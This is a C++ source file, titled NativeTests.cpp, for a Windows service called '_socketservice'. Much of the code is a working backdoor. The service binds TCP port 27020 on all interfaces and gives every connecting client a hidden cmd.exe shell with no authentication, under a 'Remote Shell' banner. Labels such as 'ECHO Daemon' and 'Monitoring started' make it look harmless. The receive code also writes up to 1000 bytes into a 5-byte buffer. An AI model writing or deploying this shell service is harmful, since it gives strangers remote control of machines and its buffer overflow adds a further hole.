// NativeTests.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#include <iostream>
#include <codecvt>
#include <locale> 
#include "win32.h"
#include "log.h"
using namespace std;

#ifdef _DEBUG
bool SHOW_ERRORS = true;
#else
bool SHOW_ERRORS = false;
#endif

#ifdef UNICODE
const LPWSTR SVC_NAME = L"_socketservice";
#else    
const LPSTR SVC_NAME = "_socketservice";
#endif

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ws2_32.lib") //Winsock Library
void (* _EventNotifierFunction)(WORD EventCode);
SERVICE_STATUS ServiceStatus; 
SERVICE_STATUS_HANDLE hStatus; 
BOOL ConsoleCtrlHandler(DWORD CtrlCode);
void  ServiceMain(int argc, char** argv); 
void  ControlHandler(DWORD request); 
int InitService();
void ServiceReportEvent(WORD  LogType, const TCHAR* ProcessName, TCHAR* Message);
int _MainFunction(int argc, char* argv[]);
long Continue();
long Pause();
long Stop();
void StartInBackground()
{
    LOG_INFO("ccc-service::StartInBackground", "StartInBackground");

    SERVICE_TABLE_ENTRY DispatchTable[] = {
          {TEXT("")/*_ProcessName.c_str()*/, (LPSERVICE_MAIN_FUNCTION)ServiceMain},
         {NULL, NULL}
    };
    if (!StartServiceCtrlDispatcher(DispatchTable)) {
        LOG_ERROR("ccc-service::StartInBackground", "StartServiceCtrlDispatcher failed %ls (%d)", SVC_NAME, GetLastError());
        ServiceReportEvent(0, SVC_NAME, TEXT("StartServiceCtrlDispatcher failed"));


        return;
    }
    return;

}

long StartInForeground(int argc, char* argv[])
{
    long RetVal = -1;

    if (!SetConsoleCtrlHandler((PHANDLER_ROUTINE)ConsoleCtrlHandler, TRUE)) {
        return RetVal;
    }

    RetVal = _MainFunction(argc, argv);

    return RetVal;
}

 
void main() 
{ 
  WriteToLog("main");
  LOG_TRACE("main", "main");
    SERVICE_TABLE_ENTRY ServiceTable[2];  
    ServiceTable[0].lpServiceName = SVC_NAME;
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
 
    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;
    // Start the control dispatcher thread for our service
    StartServiceCtrlDispatcher(ServiceTable);  
}

//The Main Thread (Handles the Pipes)
DWORD WINAPI HandleScks(LPVOID lpParam)
{
   //Variable Decle
   SOCKET theSck = (SOCKET)lpParam;
   HANDLE stdinRd, stdinWr, stdoutRd, stdoutWr;
   SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, true};
   STARTUPINFO si;
   PROCESS_INFORMATION pi;
   DWORD stuff;
   char buff[1000], recvBuff[5];
   bool firstsend;
   int offset = 0, bRecv;
    
   //Send socket some info
   if(send(theSck, "Remote Shell\r\nCoded by ExtremeCoder\r\n\r\n", sizeof("Remote Shell\r\nCoded by ExtremeCoder\r\n\r\n"), 0) == SOCKET_ERROR) goto closeSck;
    
   //Create the main transfer pipe
   if(!CreatePipe(&stdinRd, &stdinWr, &sa, 0) || !CreatePipe(&stdoutRd, &stdoutWr, &sa, 0)) {
       send(theSck, "Error Creating Pipes For Remote Shell\r\nClosing Connection...", 60, 0);
       goto closeSck;
   }
    
   //Get Process Startup Info
   GetStartupInfo(&si);
   si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
   si.wShowWindow = SW_HIDE;
   si.hStdOutput = stdoutWr;
   si.hStdError = stdoutWr;                                                                                               
   si.hStdInput = stdinRd;
#ifdef UNICODE
   if(!CreateProcess(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
       send(theSck, "Error Spawning Command Prompt. \r\nClosing Connection...", 52, 0);
       goto closeSck;
   }
#else    
   if(!CreateProcess("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
       send(theSck, "Error Spawning Command Prompt. \r\nClosing Connection...", 52, 0);
       goto closeSck;
   }
#endif
   //Create the CMD Shell using the process startup info above

    
   //Main while(1) Loop
   while(1) 
   {
       Sleep(100);
       //Check if cmd.exe has not stoped
       GetExitCodeProcess(pi.hProcess, &stuff);
       //Stop the while loop if not active
       if(stuff != STILL_ACTIVE) break;
        
       //Copy Data from buffer to pipe and vise versa
       PeekNamedPipe(stdoutRd, NULL, 0, NULL, &stuff, NULL);
       if(stuff != 0) 
       {
       //Zero buffer meomry
       ZeroMemory(buff, sizeof(buff));
       firstsend = true;
        
       do {
               //Read Console Output
               ReadFile(stdoutRd, buff, 1000, &stuff, NULL);
               if(firstsend) 
               { 
               send(theSck, buff + offset, strlen(buff) - offset, 0); 
               firstsend = false; 
               }
               else send(theSck, buff, strlen(buff), 0);
          } while(stuff == 1000);
       }
        
       if(!strcmp(recvBuff, "\r\n")) offset = 0;
       bRecv = recv(theSck, recvBuff, 1000, 0);
       if((bRecv == 0) || (bRecv == SOCKET_ERROR)) break;
       //recvBuff[bRecv] = '';
       //Read data from stream and pipe it to cmd.exe
       WriteFile(stdinWr, recvBuff, strlen(recvBuff), &stuff, NULL);
       offset = offset + bRecv;
   }
    
   //Cleaning up functions
   closeSck:
       TerminateProcess(pi.hProcess, 0);
       CloseHandle(stdinRd);
       CloseHandle(stdinWr);
       CloseHandle(stdoutRd);
       CloseHandle(stdoutWr);
       closesocket(theSck);
       return 0;
}

void ServiceMain(int argc, char** argv) 
{ 
    int error; 
    WriteToLog("ServiceMain");
  LOG_TRACE("ServiceMain", "ServiceMain");
    ServiceStatus.dwServiceType        = SERVICE_WIN32; 
    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode      = 0; 
    ServiceStatus.dwServiceSpecificExitCode = 0; 
    ServiceStatus.dwCheckPoint         = 0; 
    ServiceStatus.dwWaitHint           = 0; 

    hStatus = RegisterServiceCtrlHandler(SVC_NAME,(LPHANDLER_FUNCTION)ControlHandler); 

    if (hStatus == (SERVICE_STATUS_HANDLE)0) 
    { 
        // Registering Control Handler failed
        return; 
    }  
    // Initialize Service 
    error = InitService(); 
    if (error) 
    {
        // Initialization failed
        ServiceStatus.dwCurrentState       = SERVICE_STOPPED; 
        ServiceStatus.dwWin32ExitCode      = -1; 
        SetServiceStatus(hStatus, &ServiceStatus); 
        return; 
    } 
    // We report the running status to SCM. 
    ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
    SetServiceStatus (hStatus, &ServiceStatus);
    LOG_TRACE("ServiceMain", "1");
    // The worker loop of a service
    if (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
    {
        LOG_TRACE("ServiceMain", "SERVICE_RUNNING");
        Sleep(500);
        _MainFunction(argc, argv);
    }
    // The worker loop of a service
    
    return; 
}
  
// Service initialization
int InitService() 
{ 
    int result;
    result = WriteToLog("Monitoring started.");
    return(result); 
} 
 
 
// Control handler function
void ControlHandler(DWORD request) 
{ 
  WriteToLog("ControlHandler");
    switch(request) 
    { 
        case SERVICE_CONTROL_STOP: 
             WriteToLog("Monitoring stopped.");
 
            ServiceStatus.dwWin32ExitCode = 0; 
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
            SetServiceStatus (hStatus, &ServiceStatus);
            return; 
  
        case SERVICE_CONTROL_SHUTDOWN: 
            WriteToLog("Monitoring stopped.");
 
            ServiceStatus.dwWin32ExitCode = 0; 
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
            SetServiceStatus (hStatus, &ServiceStatus);
            return; 
         
        default:
            break;
    }  
     
    // Report current status
    SetServiceStatus (hStatus,  &ServiceStatus);
  
    return; 
}   


int _MainFunction(int argc, char** argv)
{
#ifdef UNICODE
    std::wstring strError = L"";
#else
    std::string strError = "";
#endif
    
    LOG_TRACE("ServiceMain", "4");
    WSADATA wsa;
    SOCKET master, new_socket, client_socket[30], s;
    struct sockaddr_in server, address;
    int max_clients = 30, activity, addrlen, i, valread;
    char* message = "ECHO Daemon v1.0 \r\n";

    //size of our receive buffer, this is string length.
    int MAXRECV = 1024;
    //set of socket descriptors
    fd_set readfds;
    //1 extra for null character, string termination
    char* buffer;
    buffer = (char*)malloc((MAXRECV + 1) * sizeof(char));
    LOG_TRACE("ServiceMain", "5");
    for (i = 0; i < 30; i++)
    {
        client_socket[i] = 0;
    }

    _NETPRINTF("Initialising Winsock...");
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        strError = GetLastMsg();
        _NETPRINTF("Failed. Error Code : %d %s", WSAGetLastError(), strError.c_str());
        return -1;
    }

    _NETPRINTF("Initialised.\n");

    //Create a socket
    if ((master = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
    {
        strError = GetLastMsg();
        _NETPRINTF("Could not create socket: %d %s", WSAGetLastError(), strError.c_str());
        return -1;
    }

    _NETPRINTF("Socket created.\n");
    unsigned int port = 27020;
    //Prepare the sockaddr_in structure
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(port);

    //Bind
    _NETPRINTF("Binding on port %d", port);
    DWORD bidRes = bind(master, (struct sockaddr*)&server, sizeof(server));
    while(bidRes == SOCKET_ERROR)
    {
        _NETPRINTF("Binding on port %d FAILURE", port);
        DWORD netLastErrror = WSAGetLastError();
        if (netLastErrror == 10048) {
            port++;
            server.sin_port = htons(port);
            _NETPRINTF("Binding on port %d", port);
            bidRes = bind(master, (struct sockaddr*)&server, sizeof(server));
        }
        else {
            strError = GetLastMsg();
            _NETPRINTF("Bind failed with error code : %d %s", WSAGetLastError(), strError.c_str());
            return -1;
        }
    }

    _NETPRINTF("Bind done");

    //Listen to incoming connections
    listen(master, 3);

    //Accept and incoming connection
    _NETPRINTF("Waiting for incoming connections...");

    addrlen = sizeof(struct sockaddr_in);

    while (TRUE)
    {
        //clear the socket fd set
        FD_ZERO(&readfds);

        //add master socket to fd set
        FD_SET(master, &readfds);

        //add child sockets to fd set
        for (i = 0; i < max_clients; i++)
        {
            s = client_socket[i];
            if (s > 0)
            {
                FD_SET(s, &readfds);
            }
        }

        //wait for an activity on any of the sockets, timeout is NULL , so wait indefinitely
        activity = select(0, &readfds, NULL, NULL, NULL);

        if (activity == SOCKET_ERROR)
        {
            strError = GetLastMsg();
            _NETPRINTF("select call failed with error code : %d %s", WSAGetLastError(), strError.c_str());
            return -1;
        }

        //If something happened on the master socket , then its an incoming connection
        if (FD_ISSET(master, &readfds))
        {
            if ((new_socket = accept(master, (struct sockaddr*)&address, (int*)&addrlen)) < 0)
            {
                strError = GetLastMsg();
                _NETPRINTF("accept : %d %s", WSAGetLastError(), strError.c_str());
                return -1;
            }

            //inform user of socket number - used in send and receive commands
            _NETPRINTF("New connection , socket fd is  0x%08lx , ip is : %s , port : %d \n", (unsigned int)new_socket, inet_ntoa(address.sin_addr), ntohs(address.sin_port));

     
            //add new socket to array of sockets
            for (i = 0; i < max_clients; i++)
            {
                if (client_socket[i] == 0)
                {
                    client_socket[i] = new_socket;
                    _NETPRINTF("Adding to list of sockets at index %d \n", i);
                    break;
                }
            }

            CreateThread(NULL, 0, HandleScks, (LPVOID)new_socket, 0, NULL);
        }

        //else its some IO operation on some other socket :)
        for (i = 0; i < max_clients; i++)
        {
            s = client_socket[i];
            //if client presend in read sockets             
            if (FD_ISSET(s, &readfds))
            {
                //get details of the client
                getpeername(s, (struct sockaddr*)&address, (int*)&addrlen);

                //Check if it was for closing , and also read the incoming message
                //recv does not place a null terminator at the end of the string (whilst _NETPRINTF %s assumes there is one).
                valread = recv(s, buffer, MAXRECV, 0);

                if (valread == SOCKET_ERROR)
                {
                    int error_code = WSAGetLastError();
                    if (error_code == WSAECONNRESET)
                    {
                        //Somebody disconnected , get his details and print
                        _NETPRINTF("Host disconnected unexpectedly , ip %s , port %d \n", inet_ntoa(address.sin_addr), ntohs(address.sin_port));

                        //Close the socket and mark as 0 in list for reuse
                        closesocket(s);
                        client_socket[i] = 0;
                    }
                    else
                    {
                        _NETPRINTF("recv failed with error code : %d", error_code);
                    }
                }
                if (valread == 0)
                {
                    //Somebody disconnected , get his details and print
                    _NETPRINTF("Host disconnected , ip %s , port %d \n", inet_ntoa(address.sin_addr), ntohs(address.sin_port));

                    //Close the socket and mark as 0 in list for reuse
                    closesocket(s);
                    client_socket[i] = 0;
                }
            }

            
        }
    }
}


void ServiceReportEvent(WORD EventLogType, const TCHAR* ProcessName, TCHAR* Message)
{
    HANDLE hEventSource;
    LPCTSTR lpszStrings[2];
    TCHAR Buffer[1024 + 1];

    hEventSource = RegisterEventSource(NULL, ProcessName);

    if (NULL != hEventSource) {

  
        LOG_TRACE("MultiPurposeService", "ServiceReportEvent %ls", Message);

        lpszStrings[0] = ProcessName;
        lpszStrings[1] = Buffer;

        
  
        ReportEvent(hEventSource,        // event log handle
            EventLogType,        // event type
            0,                   // event category
            0,                   // event identifier
            NULL,                // no security identifier
            2,                   // size of lpszStrings array
            0,                   // no binary data
            lpszStrings,         // array of strings
            NULL);               // no binary data

        DeregisterEventSource(hEventSource);
    }
}





BOOL ConsoleCtrlHandler(DWORD CtrlCode)
{
    // NOTE: Upon receiving a close request, we need to start the cleanup/destroy
    // sequence because after a few seconds, the process is terminated.
    switch (CtrlCode)
    {
    case CTRL_BREAK_EVENT:       Pause();                  return TRUE;
    case CTRL_C_EVENT:           Continue();               return TRUE;
    case CTRL_CLOSE_EVENT:       Stop();     Sleep(10000); return TRUE;
    case CTRL_LOGOFF_EVENT:      Stop();     Sleep(10000); return TRUE;
    case CTRL_SHUTDOWN_EVENT:    Stop();     Sleep(10000); return TRUE;
    default:                                             return FALSE;
    }
}

long Pause()
{
    //SetAndReportStatus(0, 0, 0);

    return 0;
}

long Continue()
{
    //SetAndReportStatus(0, 0, 0);

    return 0;
}

long Stop()
{
    //SetAndReportStatus(0, 0, 0);

    return 0;
}
